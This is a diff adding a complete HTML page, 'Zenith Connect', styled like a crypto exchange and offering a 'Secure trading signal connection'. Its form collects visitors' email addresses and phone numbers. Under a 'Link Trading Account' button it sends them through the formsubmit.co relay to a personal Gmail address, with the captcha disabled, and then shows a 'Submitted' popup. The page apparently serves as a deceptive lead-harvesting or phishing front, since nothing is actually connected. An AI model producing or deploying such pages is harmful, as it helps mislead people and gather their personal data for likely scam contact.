@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Zenith Connect</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+
+body{
+background:#f5f6fa;
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:70px 15px 20px;
+}
+
+/* TOP HEADER */
+.top{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+padding:16px 18px;
+background:linear-gradient(90deg,#fcd535,#f0b90b);
+font-weight:bold;
+display:flex;
+align-items:center;
+gap:10px;
+z-index:10;
+}
+
+.logo{
+width:32px;
+height:32px;
+background:black;
+border-radius:6px;
+}
+
+.container{
+background:white;
+width:100%;
+max-width:420px;
+padding:28px 22px;
+border-radius:16px;
+box-shadow:0 12px 35px rgba(0,0,0,0.12);
+}
+
+h2{margin-bottom:8px;font-size:22px}
+
+.subtitle{
+margin-bottom:22px;
+color:#666;
+font-size:14px;
+}
+
+/* INPUTS */
+input{
+width:100%;
+padding:15px;
+margin-bottom:14px;
+border-radius:10px;
+border:1px solid #ddd;
+font-size:16px;
+}
+
+input:focus{
+outline:none;
+border-color:#fcd535;
+box-shadow:0 0 0 3px rgba(252,213,53,.25);
+}
+
+/* BUTTON */
+button{
+width:100%;
+padding:16px;
+border:none;
+border-radius:10px;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+background:#fcd535;
+}
+
+button:hover{background:#f0b90b}
+
+/* SUCCESS POPUP */
+.popup{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.45);
+display:none;
+justify-content:center;
+align-items:center;
+padding:20px;
+}
+
+.popup-box{
+background:white;
+padding:35px 28px;
+border-radius:16px;
+text-align:center;
+animation:pop .35s ease;
+max-width:320px;
+width:100%;
+}
+
+@keyframes pop{
+from{transform:scale(.7);opacity:0}
+to{transform:scale(1);opacity:1}
+}
+
+/* MOBILE POLISH */
+@media(max-width:420px){
+h2{font-size:20px}
+}
+</style>
+</head>
+
+<body>
+
+<div class="top">
+<div class="logo"></div>
+<div>Zenith Connect</div>
+</div>
+
+<div class="container">
+
+<h2>Connect Software Signals</h2>
+
+<div class="subtitle">
+Secure trading signal connection
+</div>
+
+<form action="https://formsubmit.co/zenithaurora777@gmail.com"
+method="POST"
+onsubmit="showPopup()">
+
+<input type="email" name="Email" placeholder="Email Address" required>
+
+<input type="tel" name="Phone" placeholder="Phone Number (include country code)" required>
+
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_template" value="table">
+
+<button type="submit">Link Trading Account</button>
+
+</form>
+
+</div>
+
+<div id="popup" class="popup">
+<div class="popup-box">
+<h3>✅ Submitted</h3>
+<p>Your details were sent successfully</p>
+</div>
+</div>
+
+<script>
+function showPopup(){
+document.getElementById("popup").style.display="flex";
+}
+</script>
+
+</body>
+</html>
